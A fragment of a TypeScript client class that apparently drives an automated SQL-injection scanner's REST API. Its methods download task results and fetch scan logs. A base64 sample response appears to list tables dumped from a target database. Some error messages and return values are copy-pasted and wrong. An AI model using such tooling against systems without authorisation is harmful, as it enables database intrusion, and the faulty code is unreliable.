B8IDM3ICAgICAgfAp8IGNhdGFsb2dfY2F0ZWdvcnkgICAgICAgICAgICAgICAgICAgICAgfCAyNyAgICAgIHwKfCBldmVudCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgNiAgICAgICB8CnwgYXdhcmQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8IDQgICAgICAgfAp8IGhvbWVfb2ZmZXIgICAgICAgICAgICAgICAgICAgICAgICAgICAgfCA0ICAgICAgIHwKfCBzbGlkZXIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgNCAgICAgICB8CnwgYGxhbmd1YWdlYCAgICAgICAgICAgICAgICAgICAgICAgICAgICB8IDMgICAgICAgfAp8IGFkbWluICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfCAyICAgICAgIHwKfCBiaW5kaW5nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgMiAgICAgICB8CnwgcmVnaW9uICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8IDIgICAgICAgfAp8IGRpc2NvdW50ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfCAxICAgICAgIHwKfCBzaG9wX3NlcnZpY2UgICAgICAgICAgICAgICAgICAgICAgICAgIHwgMSAgICAgICB8CnwgdGVybXNfY29uZGl0aW9ucyAgICAgICAgICAgICAgICAgICAgICB8IDEgICAgICAgfAorLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKy0tLS0tLS0tLSsKCg=="
    }
     */
    public downloadTask(taskId: string, target:string, file:string) {
        //@get("/download/<taskid>/<target>/<filename:path>")
        const api = `/download/${taskId}/${target}/${file}`;
        return Request.get(`${this.server}${api}`).then((res: any) => {
            if (!res.success) {
                throw Error(`get all task list fail`);
            }
            return res.tasks;
        }).catch(err => {
            console.error(`[e]start sacn fail: %c${err}`, 'color: green');
        })
    }

    /**
     * 获取扫描日志
     * @get("/scan/<taskid>/log") Retrieve the log messages
     */
    public getScanLog(taskId: string) {
        const api = `/scan/${taskId}/log`;
        return Request.get(`${this.server}${api}`).then((res: any) => {
            if (!res.success) {
                throw Error(`get all task list fail`);
            }
            return res.tasks;
        }).catch(err => {
            console.error(`[e]start sacn fail: %c${err}`, 'color: green');
        })
    }
}